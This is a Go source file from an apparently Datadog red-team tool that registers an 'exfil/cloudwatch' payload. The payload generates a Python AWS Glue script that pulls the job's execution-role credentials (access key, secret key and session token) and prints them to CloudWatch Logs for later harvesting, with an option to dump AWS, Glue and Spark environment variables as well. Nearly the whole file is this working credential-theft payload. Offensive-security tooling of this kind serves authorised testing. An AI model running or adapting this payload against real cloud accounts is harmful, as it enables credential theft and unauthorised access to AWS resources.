// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package glue

import (
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilCloudWatchPayload generates a Glue Python Shell script that extracts
// the Glue job's execution role credentials and prints them to stdout, which
// Glue writes to CloudWatch Logs. The module can fetch these from CloudWatch
// after the job completes, or the credentials are visible in the Glue console.
type ExfilCloudWatchPayload struct{}

func init() {
	payloads.Register(&ExfilCloudWatchPayload{})
}

func (p *ExfilCloudWatchPayload) GetName() string {
	return "exfil/cloudwatch"
}

func (p *ExfilCloudWatchPayload) GetDescription() string {
	return "Extract execution role credentials and print to CloudWatch Logs via Glue job"
}

func (p *ExfilCloudWatchPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
	}
}

func (p *ExfilCloudWatchPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "INCLUDE_ENV",
			Description: "Include environment variables in output (true/false)",
			Required:    false,
			Default:     "false",
		},
	}
}

func (p *ExfilCloudWatchPayload) Validate(options map[string]string) error {
	return nil
}

func (p *ExfilCloudWatchPayload) GenerateCode(options map[string]string) (string, error) {
	includeEnv := options["INCLUDE_ENV"] == "true"

	envCode := ""
	if includeEnv {
		envCode = `
import os
print("\\nEnvironment Variables:")
for key, value in sorted(os.environ.items()):
    if key.startswith(('AWS_', 'GLUE_', 'SPARK_')):
        print(f"  {key}={value}")
`
	}

	code := `import boto3

sts = boto3.client('sts')
session = boto3.Session()

# Get caller identity
identity = sts.get_caller_identity()
print(f"Account: {identity['Account']}")
print(f"ARN: {identity['Arn']}")
print(f"UserId: {identity['UserId']}")
print(f"Region: {session.region_name}")

# Extract role credentials
credentials = session.get_credentials()
if credentials:
    creds = credentials.get_frozen_credentials()
    print(f"--- PATHFINDER_IDENTITY_DATA ---")
    print(f"NAME=glue-role/{identity['Arn'].split('/')[-1]}")
    print(f"TYPE=keys")
    print(f"ACCESS_KEY_ID={creds.access_key}")
    print(f"SECRET_ACCESS_KEY={creds.secret_key}")
    if creds.token:
        print(f"SESSION_TOKEN={creds.token}")
    print(f"REGION={session.region_name}")
    print(f"AUTO_SWITCH=false")
    print(f"--- END_PATHFINDER_IDENTITY_DATA ---")
else:
    print("Warning: could not extract credentials from session")
` + envCode

	return code, nil
}

func (p *ExfilCloudWatchPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
